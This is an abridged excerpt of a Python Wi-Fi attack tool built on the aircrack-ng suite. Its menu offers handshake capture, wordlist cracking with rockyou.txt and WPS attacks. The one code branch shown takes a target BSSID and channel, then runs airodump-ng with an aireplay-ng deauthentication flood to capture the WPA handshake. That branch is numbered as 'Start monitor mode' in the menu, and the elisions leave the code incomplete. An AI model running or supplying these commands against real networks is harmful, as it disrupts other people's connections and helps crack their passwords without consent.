...
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚══════╝ ╚═════╝ 
-----------------------------------------------------------------------                                                                       
(1)Start monitor mode                       (7)Crack Handshake with rockyou.txt (Handshake needed)
(2)Stop monitor mode                        (8)Crack Handshake with wordlist    (Handshake needed)
(3)Scan Networks                            (9)Crack Handshake without wordlist (Handshake,essid needed)
(4)Getting Handshake(monitor mode needed)   (10)Create wordlist
(5)Install Wireless tools                   (11)WPS Networks attacks (bssid,monitor mode needed)
(6)Exit                                     (13)Scan for WPS Networks
(0)About Me
-----------------------------------------------------------------------
""")
    ...
    if var == 1 :
        ...
        cmd       = os.system("sleep 4")
        geny      = os.system(order)
        print("\nEnter the bssid of the network?")
        bssid     = str(input(""))
        print("\nEnter the channel of the network?")
        channel   = int(input())
        print("\nEnter the path of the output file :(with .cap) ")
        path      = str(input(""))
        order    = "airodump-ng {} --bssid {} -c {} -w {} -M | xterm -e aireplay-ng -0 30 -a {} {}".format(interface,bssid,channel,path,bssid,interface)
        geny     = os.system(order)
        intro()
    elif var == 5 :
        def wire():
